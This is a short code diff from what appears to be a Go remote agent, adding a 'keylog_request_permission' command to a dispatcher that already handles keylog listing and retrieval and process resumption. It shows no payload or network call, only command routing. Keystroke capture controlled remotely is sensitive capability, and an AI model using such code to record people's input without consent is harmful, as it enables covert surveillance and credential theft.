@@ -2276,6 +2276,8 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			resumePid = int32(p)
 		}
 		return HandleProcessResume(ctx, env, cmdID, resumePid)
+	case "keylog_request_permission":
+		return HandleKeylogRequestPermission(ctx, env, cmdID)
 	case "keylog_list":
 		return HandleKeylogList(ctx, env, cmdID)
 	case "keylog_retrieve":
